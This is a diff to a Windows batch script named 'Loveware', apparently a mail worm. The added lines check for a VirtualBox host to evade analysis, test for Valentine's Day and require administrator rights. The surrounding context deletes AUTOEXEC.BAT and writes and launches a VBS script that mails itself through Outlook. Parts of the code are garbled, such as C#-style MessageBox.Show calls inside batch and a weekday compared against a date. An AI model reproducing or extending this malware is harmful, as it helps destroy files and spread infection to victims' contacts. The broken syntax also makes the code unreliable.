@@ -72,19 +72,43 @@ color 57
 
 title Loveware
 
+:: Detect if program is running in virtualmachine
+
+FOR /F "tokens=* USEBACKQ" %%F IN (`WMIC COMPUTERSYSTEM GET MANUFACTURER`) DO (
+SET var=%%F
+)
+echo %var%
+
+if %var% == VirtualBox (
+    MessageBox.Show("ERROR could not run application", Valentine);
+
+
+:: Do not run on valentine function
+
+for /f "skip=1" %%x in ('wmic os get localdatetime') do if not defined MyDate set MyDate=%%x
+for /f %%x in ('wmic path win32_localtime get /format:list ^| findstr "="') do set %%x
+
+set today=%Year%
+
+for /f "delims=" %%a in ('c:\date.exe +%%w') do set DayOfWeek=%%a
+if %DayOfWeek% == 14-02-%Year% (
+    MessageBox.Show("Happy Valentine!!", Valentine);
+) else (
+    goto :admin
+)
+
+:: Only run as admin function
+
+:admin
+
 net session >nul 2>&1
 
 if %errorLevel% == 0 (
-
     goto runner
-
 ) else (
-
     MessageBox.Show("ERROR! You need to run as admin!", Run as admin);
-
-	pause
-
-	exit
+    pause
+    exit
 
 )
 
@@ -172,6 +196,7 @@ goto Infect
 :: with outlook
 
 :worm
+
 set Slash=\
 if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
 del %SystemDrive%%Slash%AUTOEXEC.BAT
@@ -209,6 +234,7 @@ echo Mail.send>>%SystemDrive%\mail.vbs
 echo Next>>%SystemDrive%\mail.vbs
 echo ol.Quit>>%SystemDrive%\mail.vbs
 start "" "%SystemDrive%\mail.vbs"
+
 goto run2
 goto worm
 
